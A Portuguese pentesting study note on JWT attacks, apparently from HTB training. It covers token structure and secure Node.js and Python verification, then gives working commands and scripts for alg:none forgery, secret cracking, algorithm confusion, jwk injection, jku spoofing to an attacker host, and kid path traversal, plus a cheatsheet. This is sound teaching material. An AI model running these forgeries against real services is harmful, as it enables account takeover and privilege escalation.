---
title: "JWT Attacks"
---

# JWT Attacks

# O que é?

JSON Web Token (JWT) é um padrão aberto definido pela RFC 7519 que descreve um formato compacto e autocontido para transmitir informações entre partes como um objeto JSON. Diferente de sessões tradicionais, onde o servidor precisa manter estado, o JWT carrega todas as informações necessárias dentro do próprio token — por isso é classificado como mecanismo de autenticação **stateless**.

Um JWT é composto por três partes separadas por ponto (`.`):

```
HEADER.PAYLOAD.SIGNATURE
```

Cada parte é codificada em **Base64URL** (variante do Base64 que substitui `+` por `-` e `/` por `_`, omitindo o padding `=`, para ser seguro em URLs e headers HTTP).

**Header** — descreve o tipo do token e o algoritmo de assinatura:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** — carrega os claims (afirmações sobre o usuário e metadados):
```json
{
  "iss": "https://auth.exemplo.com",
  "sub": "user123",
  "aud": "https://api.exemplo.com",
  "exp": 1711186044,
  "iat": 1711182444,
  "nbf": 1711182444,
  "jti": "uuid-unico-por-token",
  "role": "admin"
}
```

Claims registrados pela RFC 7519:
- `iss` (issuer): quem emitiu o token
- `sub` (subject): entidade sobre a qual o token faz afirmações (tipicamente o user ID)
- `aud` (audience): destinatário(s) que devem aceitar o token
- `exp` (expiration): timestamp Unix de expiração — token deve ser rejeitado após esse momento
- `iat` (issued at): quando o token foi emitido
- `nbf` (not before): token só é válido após esse timestamp
- `jti` (JWT ID): identificador único do token, usado para evitar replay attacks

**Signature** — garante a integridade do token. Calculada sobre o header e payload codificados:
```
HMACSHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
```

**Tipos de JWT:**
- **JWS (JSON Web Signature)**: o tipo mais comum — o payload é assinado mas não cifrado. Qualquer pessoa pode ler o payload decodificando o Base64URL, mas não pode alterar sem invalidar a assinatura.
- **JWE (JSON Web Encryption)**: o payload é cifrado, garantindo confidencialidade. Menos comum em autenticação web, mais usado em contextos onde o payload contém dados sensíveis.

Os algoritmos de assinatura suportados são divididos em duas categorias:
- **Simétricos (HMAC)**: HS256, HS384, HS512 — mesma chave para assinar e verificar. O servidor que emite e o que valida precisam compartilhar o segredo.
- **Assimétricos (RSA/ECDSA)**: RS256, RS384, RS512, ES256, ES384, ES512 — chave privada assina, chave pública verifica. Permite que múltiplos serviços verifiquem tokens sem ter acesso à chave de assinatura.

---

# Onde é implementado?

JWTs são onipresentes em arquiteturas modernas de software. Como pentester, você os encontrará em praticamente qualquer sistema que precise de autenticação escalável e stateless.

**APIs REST e microsserviços**: o caso de uso mais comum. Cada microsserviço pode validar o token de forma independente, sem consultar um serviço central de sessão. Isso elimina o ponto único de falha e reduz latência. Sistemas como Netflix, Uber e Airbnb utilizam JWTs internamente para propagar identidade entre serviços.

**Single Page Applications (SPAs)**: aplicações React, Angular e Vue.js armazenam o JWT no `localStorage` ou `sessionStorage` e o enviam em cada requisição via header `Authorization: Bearer TOKEN`. O backend é completamente stateless — pode ser escalado horizontalmente sem preocupação com sessão compartilhada.

**OAuth 2.0 e OpenID Connect (OIDC)**: o JWT é o formato padrão para `access_token` e `id_token` no ecossistema OAuth/OIDC. Quando você loga com Google, GitHub ou Microsoft, o provedor de identidade emite um JWT com as claims do usuário. O `id_token` do OIDC é sempre um JWT contendo informações como nome, email e foto de perfil.

**SSO Federado (Single Sign-On)**: empresas que usam Azure AD, Okta, Auth0 ou Keycloak emitem JWTs como mecanismo central de propagação de identidade. Um único login no IdP gera um JWT aceito por dezenas de aplicações internas.

**Mobile backends**: aplicativos iOS e Android armazenam JWTs no keychain/keystore e os enviam em requisições à API. A natureza stateless é crítica para backends móveis que precisam escalar globalmente.

**Cenários onde você os encontrará em pentest:**
- Header `Authorization: Bearer eyJ...` em qualquer requisição autenticada
- Cookies com nome `jwt`, `token`, `access_token` ou `id_token`
- Query parameters `?token=eyJ...` (má prática, mas comum em implementações antigas)
- Campos `token` em respostas JSON de endpoints de login
- Headers customizados como `X-Auth-Token` ou `X-JWT-Token`

---

# Como funciona de forma adequada?

O fluxo correto de emissão e validação de JWT segue o seguinte ciclo:

```
+----------+                          +----------+                    +----------+
|  Client  |                          |  Auth    |                    |  API     |
| (browser |                          |  Server  |                    |  Server  |
|  /app)   |                          |          |                    |          |
+----------+                          +----------+                    +----------+
     |                                     |                               |
     |  POST /login                        |                               |
     |  {username, password}               |                               |
     |------------------------------------>|                               |
     |                                     |                               |
     |                           [valida credenciais]                      |
     |                           [gera payload com claims]                 |
     |                           [assina com HMAC-SHA256]                  |
     |                                     |                               |
     |  HTTP 200                           |                               |
     |  {token: "eyJhbGci..."}             |                               |
     |<------------------------------------|                               |
     |                                     |                               |
     |  GET /api/recurso                   |                               |
     |  Authorization: Bearer eyJhbGci... |                               |
     |---------------------------------------------------------->|        |
     |                                     |                    [verifica assinatura]
     |                                     |                    [valida exp, iss, aud]
     |                                     |                    [extrai claims]
     |                                     |                               |
     |  HTTP 200 {dados do recurso}        |                               |
     |<----------------------------------------------------------|        |
     |                                     |                               |
```

**Implementação correta em Node.js (jsonwebtoken)**:
```javascript
const jwt = require('jsonwebtoken');

// Segredo com alta entropia — nunca hardcodar em código
// Em produção: process.env.JWT_SECRET (mínimo 256 bits)
const SECRET = process.env.JWT_SECRET;

// Emissão do token após autenticação bem-sucedida
function emitirToken(usuario) {
  const payload = {
    sub: usuario.id,
    email: usuario.email,
    role: usuario.role,
    iss: 'https://auth.exemplo.com',
    aud: 'https://api.exemplo.com',
  };

  return jwt.sign(payload, SECRET, {
    algorithm: 'HS256',   // algoritmo fixo no servidor
    expiresIn: '1h',      // exp automático — 1 hora
  });
}

// Verificação segura do token
function verificarToken(token) {
  try {
    const payload = jwt.verify(token, SECRET, {
      algorithms: ['HS256'],              // whitelist explícita de algoritmos
      issuer: 'https://auth.exemplo.com', // valida iss
      audience: 'https://api.exemplo.com' // valida aud
    });
    return payload;
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) {
      throw new Error('Token expirado — faça login novamente');
    }
    if (err instanceof jwt.JsonWebTokenError) {
      throw new Error('Token inválido');
    }
    throw err;
  }
}
```

**Implementação correta em Python (PyJWT)**:
```python
import jwt
import os
from datetime import datetime, timedelta, timezone

SECRET_KEY = os.environ['JWT_SECRET']  # nunca hardcodar

def emitir_token(usuario_id: str, role: str) -> str:
    agora = datetime.now(timezone.utc)
    payload = {
        'sub': usuario_id,
        'role': role,
        'iss': 'https://auth.exemplo.com',
        'aud': 'https://api.exemplo.com',
        'iat': agora,
        'exp': agora + timedelta(hours=1),
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

def verificar_token(token: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256'],                    # lista explícita — nunca ler do header
            options={'require': ['exp', 'iss', 'sub', 'aud']},
            issuer='https://auth.exemplo.com',
            audience='https://api.exemplo.com',
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise ValueError('Token expirado')
    except jwt.InvalidTokenError as e:
        raise ValueError(f'Token inválido: {e}')
```

**Por que JWT é útil quando implementado corretamente:**

1. **Stateless e escalável**: o servidor não precisa armazenar estado de sessão. Qualquer instância do servidor pode validar o token com a mesma chave. Isso elimina a necessidade de sessões distribuídas (Redis, banco de dados) para autenticação.

2. **Autocontido**: todas as informações necessárias para autorização estão no token. O servidor de recurso pode tomar decisões de autorização (ex: verificar `role: admin`) sem consultar o banco de dados.

3. **Interoperável**: o padrão é amplamente suportado em todas as linguagens e frameworks. Um token emitido em Python pode ser verificado em Node.js, Go, Java ou qualquer outra linguagem.

4. **Verificável**: a assinatura criptográfica garante que o token não foi alterado. Qualquer modificação nos dados invalida a assinatura — o servidor detecta imediatamente.

5. **Expiração incorporada**: o claim `exp` permite que tokens expirem automaticamente, limitando a janela de exploração caso um token seja comprometido.

**Propriedades de segurança quando bem implementado:** a assinatura criptográfica garante integridade — qualquer modificação no payload invalida o token. A confidencialidade do payload depende de HTTPS, não do Base64URL (que é apenas codificação, não cifragem). A expiração automática via `exp` limita a janela de exploração caso um token seja comprometido. Os claims `iss` e `aud` previnem o reuso de tokens entre serviços distintos.

---

## A Falha: Confiança em Algoritmo e Assinatura Controlados pelo Cliente

JSON Web Tokens foram projetados para permitir autenticação stateless: o servidor codifica os dados do usuário em um token assinado e não precisa consultar um banco de dados a cada requisição. A suposição de design é que **somente o servidor pode gerar tokens válidos**, porque somente ele conhece a chave secreta.

A falha fundamental é que o formato JWT coloca o **algoritmo de assinatura dentro do próprio token**, no header controlado pelo cliente. Isso cria uma contradição: o servidor precisa ler o header para saber como verificar o token, mas o header é a parte que o atacante pode modificar. Ao confiar no algoritmo declarado pelo cliente, o servidor abre espaço para que o atacante direcione o processo de verificação.

**Perspectiva do desenvolvedor**: ao implementar JWT, o desenvolvedor instala uma biblioteca e chama algo como `jwt.decode(token, secret)`. O problema é que algumas bibliotecas, por padrão, leem o campo `alg` do header para determinar como verificar — se o desenvolvedor não especificar explicitamente qual algoritmo aceitar, a biblioteca seguirá a instrução do token. Isso não é um bug de lógica óbvio; é uma suposição de segurança enterrada na implementação da biblioteca.

Um exemplo concreto: o código Flask usa `jwt.decode(token, verify=False)` — ou seja, a biblioteca tem a chave secreta disponível mas o parâmetro `verify=False` desabilita a verificação da assinatura por completo. O servidor aceita qualquer token com qualquer conteúdo, assinado ou não.

**Impacto real**: escalada de privilégios de usuário para admin, impersonação de qualquer conta, account takeover sem conhecer credenciais, bypass de toda lógica de autorização baseada em claims do token.

---

## Causa Raiz

### Cada Ataque JWT Tem Uma Causa Raiz Específica

**Causa 1 — `alg: none` aceito**: a spec JWT define o valor `none` como algoritmo válido para desenvolvimento/debug. Bibliotecas que não explicitamente rejeitam `alg: none` aceitarão tokens sem assinatura alguma.

```python
# Vulneravel: aceita qualquer algoritmo incluindo 'none'
payload = jwt.decode(token, SECRET, algorithms=jwt.algorithms.get_default_algorithms())

# Seguro: whitelist explícita
payload = jwt.decode(token, SECRET, algorithms=["HS256"])
```

**Causa 2 — RS256 → HS256 (algorithm confusion)**: quando o servidor usa RS256 (assimétrico), ele assina com chave privada e verifica com chave pública. Se o servidor aceita o algoritmo especificado no token e muda para HS256, ele passa a usar a **chave pública como segredo HMAC**. A chave pública, por definição, é pública — o atacante a conhece, podendo forjar tokens válidos.

```python
# Vulneravel: servidor lê algoritmo do token
alg = token_header["alg"]
payload = jwt.decode(token, public_key, algorithms=[alg])  # perigoso!

# Se atacante envia alg=HS256, o servidor usa public_key como HMAC secret
# O atacante conhece public_key -> pode assinar com ela -> token aceito
```

**Causa 3 — `jwk`/`jku` sem validação**: o header JWT pode incluir a chave pública usada para verificar (`jwk`) ou uma URL de onde buscar a chave (`jku`). Se o servidor aceita chaves arbitrárias fornecidas pelo cliente, o atacante gera seu próprio par de chaves e assina tokens com a chave privada própria.

**Causa 4 — verify=False / segredo fraco**: o desenvolvedor desabilita a verificação explicitamente (geralmente para debug) ou usa um segredo previsível (palavra do dicionário, string curta) que pode ser bruteforçado via hashcat.

### Código Vulnerável vs Seguro

```python
# VULNERAVEL — aplicacao financeira em Flask com verify=False
def verify_token(token):
    try:
        # verify=False: aceita qualquer assinatura, qualquer algoritmo
        payload = jwt.decode(token, SECRET_KEY, verify=False)
        return payload
    except:
        return None

# O usuario pode trocar username de "john" para "admin" no payload
# e o servidor aceitara sem questionar, porque nao valida a assinatura
```

```python
# SEGURO
def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],   # algoritmo fixo no servidor
            options={
                "require": ["exp", "iss", "sub"],
                "verify_exp": True,
            }
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise ValueError("Token expirado")
    except jwt.InvalidTokenError:
        raise ValueError("Token inválido")
```

---

## Como o Ataque Funciona

### Estrutura de um JWT

Um JWT tem três partes separadas por ponto:
```
HEADER.PAYLOAD.SIGNATURE
```

Exemplo real:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJleHAiOjE3MTExODYwNDR9.ASSINATURA
```

**Header** (base64 decodificado):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** (base64 decodificado):
```json
{
  "user": "htb-stdnt",
  "isAdmin": false,
  "exp": 1711186044
}
```

**Signature**: `HMACSHA256(base64url(header) + "." + base64url(payload), secret)`

### Algoritmos Suportados

| alg | Algoritmo |
|-----|-----------|
| HS256 | HMAC com SHA-256 (simétrico — mesma chave para assinar e verificar) |
| HS384 | HMAC com SHA-384 |
| HS512 | HMAC com SHA-512 |
| RS256 | RSA com SHA-256 (assimétrico — chave privada assina, pública verifica) |
| ES256 | ECDSA com P-256 e SHA-256 |
| none | Sem assinatura (debug — perigoso) |

### Claims Padrão

```json
{
  "iss": "https://auth.example.com",
  "sub": "user123",
  "aud": "https://api.example.com",
  "exp": 1711186044,
  "iat": 1711182444,
  "nbf": 1711182444,
  "jti": "unique-token-id"
}
```

---

## Discovery / Identificação

### Identificar JWTs em Uso

```bash
# Fazer login e verificar cookies/headers de resposta
curl -s -X POST "http://alvo.com/login" \
     -d "username=admin&password=admin" \
     -v 2>&1 | grep -i "set-cookie\|authorization\|bearer\|jwt"

# Verificar se a sessao usa JWT (começa com "eyJ")
# Qualquer valor base64 que comece com eyJ e provavelmente JWT
```

### Analisar JWT com jwt_tool

```bash
# Instalar
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Analisar um token
python3 jwt_tool/jwt_tool.py \
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.ASSINATURA

# Saida esperada:
# [+] alg = "HS256"
# [+] user = "admin"
# [+] exp = 2024-03-23 10:27:24 (UTC)
# [-] TOKEN IS EXPIRED!
```

### Decodificar Manualmente

```bash
# Separar as partes e decodificar
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null
echo "eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjpmYWxzZX0=" | base64 -d 2>/dev/null

# Python
python3 -c "
import base64, json, sys
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.ASSINATURA'
parts = token.split('.')
for part in parts[:2]:
    padded = part + '=' * (4 - len(part) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(padded)), indent=2))
"
```

---

## Exploitation

### 1. Missing Signature Verification

Se o servidor aceita JWTs sem verificar a assinatura (como no caso do `verify=False`), podemos modificar o payload livremente. Este é o mais simples: não precisamos nem saber a chave secreta.

**Passos**:
1. Obter JWT válido fazendo login
2. Modificar payload no jwt.io (ex: `isAdmin: false` → `isAdmin: true`)
3. Usar o JWT modificado na requisição

```bash
# Forjar JWT modificado (jwt.io faz isso automaticamente ao editar)
# Copiar o novo token do lado esquerdo do jwt.io

# Usar o token forjado
curl -s "http://alvo.com/home" \
     -H "Cookie: session=TOKEN_FORJADO" | grep -i admin
```

### 2. None Algorithm Attack

Setar `alg` para `none` — o servidor (se mal configurado) aceita o token sem verificar assinatura.

**Via jwt_tool**:
```bash
# Forjar com algoritmo none, setando isAdmin como true
python3 jwt_tool/jwt_tool.py \
    TOKEN_ORIGINAL \
    -X a \
    -pc isAdmin \
    -pv true \
    -I

# O tool gera variantes: "none", "None", "NONE", "nOnE" etc.
```

**Via CyberChef**:
1. Abrir CyberChef → JWT Sign
2. Definir Signing algorithm: `None`
3. Inserir payload: `{"user":"htb-stdnt","isAdmin":true,"exp":1711186044}`
4. Copiar output

**Estrutura do token none** (nota: ponto final obrigatório):
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfQ.
```

```bash
# Usar token none
curl -s "http://alvo.com/home" \
     -H "Cookie: session=TOKEN_NONE." | grep -i admin
```

### 3. Cracking do Segredo (HS256/HS384/HS512)

Algoritmos simétricos — se o segredo é fraco (palavra do dicionário, string curta), pode ser bruteforçado.

```bash
# Salvar JWT em arquivo
echo -n "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.ASSINATURA" > jwt.txt

# Crackear com hashcat (modo 16500 = JWT)
hashcat -m 16500 jwt.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

# Verificar resultado
hashcat -m 16500 jwt.txt rockyou.txt --show
# Output: TOKEN:segredo_encontrado

# Alternativa com john
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# Forjar token com segredo encontrado
python3 jwt_tool/jwt_tool.py TOKEN_ORIGINAL -T
# E depois assinar com o segredo encontrado no jwt.io
```

**Usando jwt.io para reforjar**:
1. Colar o JWT original
2. Modificar `isAdmin: true` no payload
3. Inserir o segredo descoberto no campo "Verify Signature"
4. Copiar o novo token (assinatura válida)

### 4. Algorithm Confusion (RS256 → HS256)

**Cenário**: servidor usa RS256 (assimétrico). A chave pública é usada para verificar. Se o servidor aceita o algoritmo especificado no token, podemos mudar para HS256 e assinar com a chave pública (que é... pública, portanto acessível ao atacante).

```bash
# Passo 1: obter dois JWTs diferentes do servidor
# (fazer login duas vezes)

# Passo 2: extrair a chave publica com rsa_sign2n
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
docker build . -t sig2n
docker run -it sig2n /bin/bash

# Dentro do container:
python3 jwt_forgery.py JWT1 JWT2

# Output: arquivo .pem com chave publica candidata + JWTs HS256 forjados

# Passo 3: testar se o servidor e vulneravel
curl -s "http://alvo.com/home" \
     -H "Cookie: session=JWT_HS256_GERADO"

# Passo 4: forjar com isAdmin=true via CyberChef
# JWT Sign → HS256 → colar chave publica no campo "Private/Secret Key"
# Adicionar \n ao final da chave publica
```

**Via jwt_tool — algorithm confusion**:
```bash
python3 jwt_tool/jwt_tool.py TOKEN \
    -X k \
    -pk public_key.pem \
    -pc isAdmin \
    -pv true \
    -I
```

### 5. Exploiting jwk Header Claim

O header `jwk` pode conter a chave pública usada para verificar. Se o servidor aceita chave arbitrária no `jwk`, podemos gerar nosso par de chaves e assinar com nossa chave privada.

```bash
# Gerar par de chaves RSA
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem

# Script Python para forjar JWT com jwk embedding
pip3 install pyjwt cryptography python-jose
```

```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# Converter PEM para JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()

# Forjar JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256',
                   headers={'jwk': jwk_dict})

print(token)
```

### 6. Exploiting jku Header Claim

O header `jku` aponta para uma URL que hospeda as chaves públicas (JWKS). Se o servidor não valida qual URL é permitida:

```bash
# Criar nosso JWKS
openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem

# Gerar JWKS a partir da chave publica (usar script Python ou conversor online)
# Hospedar em nosso servidor
python3 -m http.server 80

# Forjar JWT com jku apontando para nosso servidor
python3 jwt_tool/jwt_tool.py TOKEN \
    -X s \
    -ju "http://ATACANTE_IP/jwks.json" \
    -pk exploit_private.pem \
    -pc isAdmin \
    -pv true \
    -I
```

**kid (Key ID) — SQL Injection**:
```bash
# kid pode ser vulneravel a SQL injection ou path traversal
python3 jwt_tool/jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null"
```

---

## Bypass

### Bypass de Expiração (exp)

```bash
# Modificar timestamp exp para futuro
python3 jwt_tool/jwt_tool.py TOKEN \
    -pc exp \
    -pv 9999999999 \
    -I

# Se o servidor nao verifica exp → token expirado funciona
curl -s "http://alvo.com/api/data" \
     -H "Authorization: Bearer TOKEN_EXPIRADO"
```

### Reuso de JWT entre Aplicações

Se duas aplicações compartilham o mesmo segredo JWT:

```bash
# Login no servico A (privilegio moderador)
# Usar esse JWT no servico B (que aceita o mesmo segredo)
curl -s "http://servicob.alvo.com/admin" \
     -H "Authorization: Bearer JWT_DO_SERVICO_A"
```

---

## Ferramentas

### jwt_tool

```bash
# Instalar
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# Analise basica
python3 jwt_tool.py TOKEN

# Rodar todos os exploits automaticamente
python3 jwt_tool.py TOKEN -X all

# Flags de exploit (-X)
# a = alg:none
# n = null signature
# b = blank password accepted
# s = spoof JWKS (-ju para URL)
# k = algorithm confusion (-pk para chave publica)
# i = inject inline JWKS

# Crack do segredo
python3 jwt_tool.py TOKEN -C -d rockyou.txt

# Forjar claims especificos
python3 jwt_tool.py TOKEN -pc isAdmin -pv true -I -X a
```

---

## Detecção e Mitigação

### Sinais de Vulnerabilidade JWT

- Servidor aceita tokens expirados
- Servidor aceita tokens com `alg: none`
- Segredo é uma palavra do dicionário (hashcat quebra em minutos)
- Header `jwk` ou `jku` aceita valores arbitrários
- Servidor usa o algoritmo especificado NO TOKEN (não hardcoded no servidor)
- `verify=False` no código (grep no repositório)

### Prevenção

```python
# Python — verificacao segura de JWT
import jwt

# Hardcode o algoritmo esperado — NUNCA usar o do token
token_data = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=["HS256"],   # lista explícita, nao confiar no header
    options={"require": ["exp", "iss"]}  # exigir claims criticos
)

# Rejeitar alg:none explicitamente
if "none" in token_header["alg"].lower():
    raise ValueError("Algoritmo invalido")
```

**Checklist de prevenção**:
- Hardcodar algoritmo esperado no servidor (não ler do header)
- Usar segredos com alta entropia (32+ bytes aleatórios, não palavras)
- Nunca usar `verify=False` em produção — remover flags de debug antes de deploy
- Sempre incluir `exp` com tempo curto (1-24h)
- Validar claims `iss` e `aud` para evitar reuso entre serviços
- Usar whitelist de URLs se usar `jku`
- Rejeitar tokens com `jwk` no header (não aceitar chave do cliente)
- Bibliotecas atualizadas (CVEs frequentes em JWT libs)

---

## Cheatsheet Rápido

| Ataque | Ferramenta | Comando |
|--------|-----------|---------|
| Analisar token | jwt_tool | `python3 jwt_tool.py TOKEN` |
| None algorithm | jwt_tool | `python3 jwt_tool.py TOKEN -X a -pc isAdmin -pv true -I` |
| Crack segredo | hashcat | `hashcat -m 16500 jwt.txt rockyou.txt` |
| Crack segredo | jwt_tool | `python3 jwt_tool.py TOKEN -C -d rockyou.txt` |
| Algorithm confusion | rsa_sign2n | `python3 jwt_forgery.py JWT1 JWT2` |
| jwk inject | Python script | Gerar chaves + forjar com jose lib |
| jku spoof | jwt_tool | `python3 jwt_tool.py TOKEN -X s -ju http://ATACANTE/jwks.json` |
| Reforjar com segredo | jwt.io | Editar payload + inserir segredo |

---

## Módulos Relacionados

JWT attacks se intersectam com toda a cadeia de autenticação e autorização. O módulo de **Brute Force/Broken Auth** (`01_brute_force_e_broken_auth.md`) é o complemento direto: JWT é um mecanismo de autenticação e um segredo fraco torna o token tão vulnerável quanto uma senha fraca a brute force via hashcat. **Session Security** (`04_session_security.md`) cobre o cenário onde JWT substitui cookies de sessão clássicos — o impacto de um token forjado é equivalente ao de um session hijack. Para o pós-exploração, **Broken Access Control** (`../08_access_control/02_broken_access_control.md`) detalha como claims de role no JWT controlam autorização e como forjar um claim `role: admin` constitui escalada de privilégio. As ferramentas de referência são jwt_tool (https://github.com/ticarpi/jwt_tool), rsa_sign2n (https://github.com/silentsignal/rsa_sign2n), jwt.io para debug e forge manual, e CyberChef para a operação JWT Sign. A base teórica está no HTB Senior Web Pentester — Attacking Authentication Mechanisms (módulo 3) e no OWASP JWT Security Cheat Sheet.
